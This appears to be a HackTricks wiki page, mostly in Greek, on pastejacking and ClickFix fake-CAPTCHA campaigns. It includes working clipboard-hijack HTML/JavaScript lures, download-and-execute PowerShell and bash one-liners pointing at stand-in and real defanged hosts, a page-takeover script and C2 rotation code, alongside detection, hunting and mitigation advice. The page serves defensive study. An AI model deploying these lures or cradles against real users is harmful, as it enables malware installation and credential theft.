# Clipboard Hijacking (Pastejacking) Επιθέσεις

{{#include ../../banners/hacktricks-training.md}}

> «Μην επικολλάτε ποτέ κάτι που δεν έχετε αντιγράψει ο ίδιος.» – παλιά αλλά ακόμα έγκυρη συμβουλή

## Επισκόπηση

Clipboard hijacking – also known as *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες συνήθως αντιγράφουν και επικολλούν εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη ιστοσελίδα (ή οποιοδήποτε περιβάλλον με υποστήριξη JavaScript, όπως ένα Electron ή Desktop application) τοποθετεί προγραμματιστικά κείμενο που ελέγχεται από τον attacker στο σύστημα clipboard. Τα θύματα παροτρύνονται, συνήθως με προσεκτικά σχεδιασμένες οδηγίες social-engineering, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ή να ανοίξουν ένα τερματικό και να *επικολλήσουν* το περιεχόμενο του clipboard, εκτελώντας άμεσα αυθαίρετες εντολές.

Επειδή **κανένα αρχείο δεν κατεβαίνει και κανένα attachment δεν ανοίγει**, η τεχνική παρακάμπτει τους περισσότερους ελέγχους ασφαλείας σε e-mail και web-content που παρακολουθούν attachments, macros ή άμεση εκτέλεση εντολών. Η επίθεση είναι επομένως δημοφιλής σε phishing καμπάνιες που διανέμουν commodity malware οικογένειες όπως NetSupport RAT, Latrodectus loader ή Lumma Stealer.

## Εξαναγκασμένα κουμπιά αντιγραφής και κρυμμένα payloads (macOS one-liners)

Κάποια macOS infostealers κλωνοποιούν sites εγκαταστατών (π.χ., Homebrew) και **εξαναγκάζουν τη χρήση ενός “Copy” button** ώστε οι χρήστες να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η εγγραφή στο clipboard περιέχει την αναμενόμενη εντολή εγκατάστασης συν ένα προστιθέμενο Base64 payload (π.χ., `...; echo <b64> | base64 -d | sh`), οπότε μια μοναδική επικόλληση εκτελεί και τα δύο ενώ το UI κρύβει το επιπλέον στάδιο.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Παλαιότερες καμπάνιες χρησιμοποιούσαν `document.execCommand('copy')`, οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).

## Η ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται ένα typosquatted ή compromised site (π.χ. `docusign.sa[.]com`)
2. Το ενσωματωμένο JavaScript του **ClearFake** καλεί την helper συνάρτηση `unsecuredCopyToClipboard()` που σιωπηλά αποθηκεύει ένα PowerShell one-liner κωδικοποιημένο σε Base64 στο clipboard.
3. Οι HTML οδηγίες λένε στο θύμα: *«Πατήστε **Win + R**, επικολλήστε την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. `powershell.exe` εκτελείται, κατεβάζοντας ένα αρχείο που περιέχει ένα νόμιμο εκτελέσιμο συν ένα κακόβουλο DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον στάδια, εγχέει shellcode και εγκαθιστά persistence (π.χ. scheduled task) – τελικά εκτελώντας NetSupport RAT / Latrodectus / Lumma Stealer.

### Παράδειγμα αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά στον φάκελό του το `msvcp140.dll`.
* Η κακόβουλη DLL επιλύει δυναμικά APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα rolling XOR key `"https://google.com/"`, ενσωματώνει το τελικό shellcode και αποσυμπιέζει **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει `la.txt` με **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Κατεβάζει ένα MSI payload → τοποθετεί `libcef.dll` δίπλα σε μια signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η **mshta** κλήση εκκινεί ένα κρυφό PowerShell script που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανασυνθέτει το `AutoIt3.exe` μέσω `extrac32` & συγκόλλησης αρχείων και τελικά εκτελεί ένα `.a3x` script το οποίο εξαποστέλλει τα διαπιστευτήρια του browser στο `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK με εναλλασσόμενο C2 (PureHVNC)

Ορισμένες εκστρατείες ClickFix παραλείπουν εντελώς τις λήψεις αρχείων και καθοδηγούν τα θύματα να επικολλήσουν ένα one‑liner που ανακτά και εκτελεί JavaScript μέσω WSH, εξασφαλίζει persistence, και εναλλάσσει το C2 καθημερινά. Παράδειγμα παρατηρούμενης αλυσίδας:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Κύρια χαρακτηριστικά
- Μασκαρισμένο URL αντιστρέφεται κατά την εκτέλεση για να αποφεύγει τον πρόχειρο έλεγχο.
- JavaScript επιμένει μέσω Startup LNK (WScript/CScript) και επιλέγει το C2 με βάση την τρέχουσα ημέρα — επιτρέποντας ταχεία domain rotation.

Ελάχιστο JS απόσπασμα που χρησιμοποιείται για την περιστροφή των C2s με βάση την ημερομηνία:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιδρύει persistence και τραβάει ένα RAT (π.χ. PureHVNC), συχνά κάνοντας TLS pinning σε ένα hardcoded πιστοποιητικό και chunking της κίνησης.

Detection ideas specific to this variant
- Δέντρο διεργασιών: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ή `cscript.exe`).
- Startup artifacts: LNK σε `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που εκκινεί WScript/CScript με διαδρομή JS κάτω από `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και telemetry γραμμής εντολών που περιέχουν `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενα `powershell -NoProfile -NonInteractive -Command -` με μεγάλα stdin payloads για να τροφοδοτούνται μεγάλα σκριπτά χωρίς μακριές γραμμές εντολών.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` κάτω από έναν task/path που μοιάζει με updater (π.χ. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Καθημερινά-rotating hostnames και URLs C2 με pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συνδέστε γεγονότα εγγραφής clipboard που ακολουθούνται από Win+R paste και άμεση εκτέλεση `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` κρατάει ιστορικό των **Win + R** εντολών – ψάξτε για ασυνήθιστα Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) όπου `ParentImage` == `explorer.exe` και `NewProcessName` βρίσκεται σε { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινά folders λίγο πριν το ύποπτο γεγονός 4688.
* EDR clipboard sensors (αν υπάρχουν) – συσχετίστε `Clipboard Write` ακολουθούμενο άμεσα από νέα PowerShell διεργασία.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Πρόσφατες καμπάνιες μαζικής παραγωγής fake CDN/browser verification pages ("Just a moment…", IUAM-style) που πιέζουν χρήστες να αντιγράψουν OS-specific εντολές από το clipboard τους σε native consoles. Αυτό μεταφέρει την εκτέλεση εκτός του browser sandbox και δουλεύει τόσο σε Windows όσο και σε macOS.

Key traits of the builder-generated pages
- OS detection μέσω `navigator.userAgent` για να προσαρμόζει τα payloads (Windows PowerShell/CMD vs. macOS Terminal). Προαιρετικά decoys/no-ops για unsupported OS ώστε να διατηρείται η ψευδαίσθηση.
- Αυτόματο clipboard-copy σε benign UI actions (checkbox/Copy) ενώ το ορατό κείμενο μπορεί να διαφέρει από το περιεχόμενο του clipboard.
- Mobile blocking και ένα popover με βήμα-βήμα οδηγίες: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Προαιρετική obfuscation και single-file injector για να αντικαταστήσει το DOM ενός compromised site με ένα Tailwind-styled verification UI (χωρίς ανάγκη νέας εγγραφής domain).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence της αρχικής εκτέλεσης
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχιστεί μετά το κλείσιμο του terminal, μειώνοντας τα ορατά artifacts.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες ανίχνευσης & hunting ειδικές για δολώματα τύπου IUAM
- Web: Σελίδες που δεσμεύουν το Clipboard API σε verification widgets· ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του clipboard payload· `navigator.userAgent` branching· Tailwind + single-page replace σε ύποπτα περιβάλλοντα.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από αλληλεπίδραση με browser· batch/MSI installers που εκτελούνται από `%TEMP%`.
- macOS endpoint: Terminal/iTerm που εκκινεί `bash`/`curl`/`base64 -d` με `nohup` κοντά σε browser events· background jobs που επιβιώνουν μετά το κλείσιμο του τερματικού.
- Συσχετίστε το `RunMRU` Win+R history και τις εγγραφές στο clipboard με μετέπειτα δημιουργία κονσόλας/console processes.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake συνεχίζει να kompromize τα WordPress sites και να ενέχει loader JavaScript που αλυσσοδένει external hosts (Cloudflare Workers, GitHub/jsDelivr) και ακόμα blockchain “etherhiding” calls (π.χ., POSTs σε Binance Smart Chain API endpoints όπως `bsc-testnet.drpc[.]org`) για να τραβήξει την τρέχουσα λογική του δολώματος. Πρόσφατα overlays χρησιμοποιούν εκτενώς fake CAPTCHAs που καθοδηγούν χρήστες να copy/paste ένα one-liner (T1204.004) αντί να κατεβάσουν οτιδήποτε.
- Η αρχική εκτέλεση ανατίθεται όλο και περισσότερο σε signed script hosts/LOLBAS. Οι αλυσίδες του Ιανουαρίου 2026 αντάλλαξαν την προηγούμενη χρήση του `mshta` με το ενσωματωμένο `SyncAppvPublishingServer.vbs` που εκτελείται μέσω `WScript.exe`, περνώντας PowerShell-like arguments με aliases/wildcards για να φέρει remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` είναι υπογεγραμμένο και συνήθως χρησιμοποιείται από το App-V· σε συνδυασμό με `WScript.exe` και ασυνήθιστα ορίσματα (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) γίνεται ένα high-signal LOLBAS stage για ClearFake.
- Οι fake CAPTCHA payloads του Φεβρουαρίου 2026 επέστρεψαν σε καθαρά PowerShell download cradles. Δύο ζωντανά παραδείγματα:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Η πρώτη αλυσίδα είναι ένας in-memory `iex(irm ...)` grabber; η δεύτερη κάνει staging μέσω `WinHttp.WinHttpRequest.5.1`, γράφει ένα προσωρινό `.ps1` και το εκκινεί με `-ep bypass` σε κρυφό παράθυρο.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Μέτρα μετριασμού

1. Browser hardening – απενεργοποιήστε την πρόσβαση εγγραφής στο clipboard (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε user gesture.
2. Security awareness – διδάξτε στους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε επεξεργαστή κειμένου.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για να μπλοκάρετε αυθαίρετα one-liners.
4. Network controls – μπλοκάρετε εξερχόμενα αιτήματα προς γνωστούς pastejacking και malware C2 domains.

## Σχετικά Κόλπα

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Αναφορές

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
